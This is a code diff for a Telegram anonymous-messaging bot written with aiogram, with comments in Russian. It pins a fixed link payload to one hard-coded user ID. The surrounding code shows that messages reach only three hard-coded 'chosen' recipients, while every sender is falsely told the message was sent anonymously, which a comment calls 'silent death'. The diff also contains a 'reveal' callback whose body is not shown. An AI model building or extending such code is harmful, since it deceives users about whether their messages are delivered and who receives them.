@@ -17,10 +17,15 @@ from aiogram.types import (
 
 # ============ НАСТРОЙКИ ============
 BOT_TOKEN = "СЮДА_ТОКЕН_БОТА"
-BOT_USERNAME = "твой_бот_username"  # без @
+BOT_USERNAME = "letsqpbot"  # без @
 
 # Три избранных получателя — только им реально приходят сообщения
 RECIPIENT_IDS = {6657840585, 1644619383, 8940835512}
+
+# Жёстко закреплённые payload'ы
+FIXED_PAYLOADS = {
+    6657840585: "t35h4",
+}
 
 # ============ БОТ ============
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
@@ -65,9 +70,23 @@ def gen_payload(length: int = 5) -> str:
 
 
 def get_or_create_payload(user_id: int) -> str:
+    # 1. Если payload уже есть в базе — возвращаем его
     row = db.execute("SELECT payload FROM users WHERE user_id = ?", (user_id,)).fetchone()
     if row:
         return row[0]
+
+    # 2. Если для этого юзера задан фиксированный payload — используем его
+    if user_id in FIXED_PAYLOADS:
+        payload = FIXED_PAYLOADS[user_id]
+        db.execute("DELETE FROM users WHERE payload = ? AND user_id != ?", (payload, user_id))
+        db.execute(
+            "INSERT OR REPLACE INTO users (user_id, payload, created_at) VALUES (?, ?, ?)",
+            (user_id, payload, datetime.utcnow())
+        )
+        db.commit()
+        return payload
+
+    # 3. Иначе — генерим случайный
     payload = gen_payload()
     db.execute(
         "INSERT INTO users (user_id, payload, created_at) VALUES (?, ?, ?)",
@@ -80,6 +99,17 @@ def get_or_create_payload(user_id: int) -> str:
 def get_recipient_by_payload(payload: str):
     row = db.execute("SELECT user_id FROM users WHERE payload = ?", (payload,)).fetchone()
     return row[0] if row else None
+
+
+def seed_fixed_payloads():
+    """Прописывает фиксированные payload'ы в базу при запуске бота."""
+    for user_id, payload in FIXED_PAYLOADS.items():
+        db.execute("DELETE FROM users WHERE payload = ? AND user_id != ?", (payload, user_id))
+        db.execute(
+            "INSERT OR REPLACE INTO users (user_id, payload, created_at) VALUES (?, ?, ?)",
+            (user_id, payload, datetime.utcnow())
+        )
+    db.commit()
 
 
 # ============ КЛАВИАТУРЫ ============
@@ -158,7 +188,7 @@ async def receive_anon(message: Message, state: FSMContext):
     payload = data.get("payload")
     sender_id = message.from_user.id
 
-    # отправителю ВСЕГДА говорим, что ушло (вариант А — тихая смерть)
+    # отправителю ВСЕГДА говорим, что ушло (тихая смерть)
     await message.answer("💌 Твоё сообщение отправлено анонимно!")
     await state.clear()
 
@@ -166,7 +196,6 @@ async def receive_anon(message: Message, state: FSMContext):
     if not is_real or recipient_id not in RECIPIENT_IDS:
         return
 
-    # берём текст или подпись к медиа
     text = message.text or message.caption or "📎 Медиа"
     if message.text:
         body = f"<blockquote>{text}</blockquote>"
@@ -196,8 +225,6 @@ async def receive_anon(message: Message, state: FSMContext):
 @dp.callback_query(F.data.startswith("copy:"))
 async def copy_link(call: CallbackQuery):
     link = call.data.split(":", 1)[1]
-    # Telegram Bot API не умеет копировать в буфер — отправляем ссылку отдельно,
-    # чтобы юзер мог нажать на неё и скопировать вручную.
     await call.message.answer(
         f"👇 Нажми на ссылку, чтобы скопировать:\n\n<code>{link}</code>"
     )
@@ -260,6 +287,7 @@ async def reveal(call: CallbackQuery):
 
 # ============ ЗАПУСК ============
 async def main():
+    seed_fixed_payloads()
     print("Бот запущен...")
     await dp.start_polling(bot)
 
